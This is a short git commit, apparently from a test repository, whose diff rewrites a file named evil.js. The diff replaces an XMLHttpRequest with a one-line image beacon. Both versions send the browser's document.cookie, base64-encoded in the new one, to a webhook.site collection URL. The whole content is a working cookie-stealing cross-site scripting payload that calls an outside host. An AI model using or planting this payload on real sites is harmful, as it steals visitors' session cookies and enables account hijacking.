a1d852274febc9e7c287d6c30446dd7eb31cba05
test <test@test.com>
2025-02-06 10:33:03 +0100

    Dodano evil.js

--- evil.js
+++ evil.js
@@ -1,3 +1,1 @@
-var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'https://webhook.site/0074dbd6-f6d3-46f0-8a7d-7ab19454fa31/?' + document.cookie, true);
-xhttp.send();
+new Image().src = 'https://webhook.site/0074dbd6-f6d3-46f0-8a7d-7ab19454fa31/?c=' + btoa(document.cookie);
